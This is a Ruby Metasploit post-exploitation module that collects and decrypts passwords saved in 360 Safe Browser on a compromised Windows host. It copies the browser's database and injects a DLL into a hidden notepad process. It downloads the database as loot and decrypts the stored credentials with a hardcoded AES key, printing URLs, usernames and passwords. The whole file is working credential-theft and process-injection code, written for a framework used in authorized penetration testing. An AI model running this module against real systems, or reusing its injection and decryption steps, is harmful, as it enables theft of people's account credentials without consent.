##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather360 Safe Browser Password',
        'Description' => %q{
          This module will collect user data from 360 Safe Browser and attempt to decrypt
          sensitive information.
        },
        'License' => MSF_LICENSE,
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Author' =>
          [
            'Kali-Team', # Original (Meterpreter script)
          ]
      )
    )

    register_options(
      [
        OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', false]),
      ]
    )
  end

  def decrypt_password(data)
    key_digest = "\x63\x66\x36\x36\x66\x62\x35\x38\x66\x35\x63\x61\x33\x34\x38\x35"
    cipher = OpenSSL::Cipher.new('aes-128-ecb')
    cipher.decrypt
    cipher.key = key_digest
    cipher.padding = 0
    ciphertext = cipher.update(data) + cipher.final
    password = ''
    (0..ciphertext.length).step(2) do |i|
      ciphertext[0].eql?("\x01") ? password += ciphertext[i].to_s : password += ciphertext[i - 1].to_s
    end
    return password.to_s
  end

  def inject_dll(process, dll_path)
    library_path = ::File.expand_path(dll_path)
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    [exploit_mem, offset]
  end

  def check_360_win(appdatapath)
    tbl = []
    db_list = session.fs.file.search(appdatapath, 'assis2.db')
    if !db_list.empty?
      db_list.each do |item|
        file_name = item['path'] + session.fs.file.separator + item['name']
        db_file_name = 'C:\\assis2.db'
        session.fs.file.copy(file_name, db_file_name)
        dll_path = File.join(Msf::Config.data_directory, 'post', '360', 'remove_password.dll')
        sqlite3_path = File.join(Msf::Config.data_directory, 'post', '360', 'sqlite3.dll')
        notepad_pathname = get_notepad_pathname(ARCH_X86, client.sys.config.getenv('windir'), client.arch)
        session.fs.file.upload_file("#{notepad_pathname.split('\\')[0..-2].join('\\')}\\sqlite3.dll", sqlite3_path)
        notepad_process = client.sys.process.execute(notepad_pathname, nil, 'Hidden' => true)
        hprocess = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
        exploit_mem, offset = inject_dll(hprocess, dll_path)
        hprocess.thread.create(exploit_mem + offset)
        sleep(5)
        client.sys.process.kill(hprocess.pid)
        print_status('==> Downloading Database...')
        local_path = store_loot('360.SafeBrowser', 'application/x-sqlite3', session, read_file(db_file_name), item['name'], 'SafeBrowser database')
        session.fs.file.download_file(local_path, db_file_name)
        print_good("==> Downloaded to #{local_path}")
        db = SQLite3::Database.new(local_path)
        result = db.execute('select domain, username, password from tb_account;')
        for row in result
          bs64 = row[2].split(')')[1].to_s
          enc_pw = Rex::Text.decode_base64(bs64)
          pw = decrypt_password(enc_pw)
          tbl << {
            url: row[0],
            username: row[1],
            password: pw
          }
        end
      end
    else
      print_warning('360 SafeBrowser database not exist!')
    end

    # print_warning('360 SafeBrowser database not exist!')
    return tbl
  end

  def run
    result = []
    print_status("Gather 360 Safe Browser Password on #{sysinfo['Computer']}")
    # https://docs.microsoft.com/zh-cn/windows/win32/winprog64/accessing-an-alternate-registry-view?redirectedfrom=MSDN
    grab_user_profiles.each do |user|
      last_install_path = registry_getvaldata("HKEY_USERS\\#{user['SID']}\\Software\\360\\360se6\\Chrome", 'last_install_path')
      next if last_install_path.nil?

      result += check_360_win(last_install_path)
    end
    columns = [
      'Url',
      'UserName',
      'Password'
    ]
    tbl = Rex::Text::Table.new(
      'Header' => '360 Safe Browser Password',
      'Columns' => columns
    )
    result.each do |item|
      tbl << item.values
    end
    print_line(tbl.to_s) if !tbl.rows.empty?
  end
end
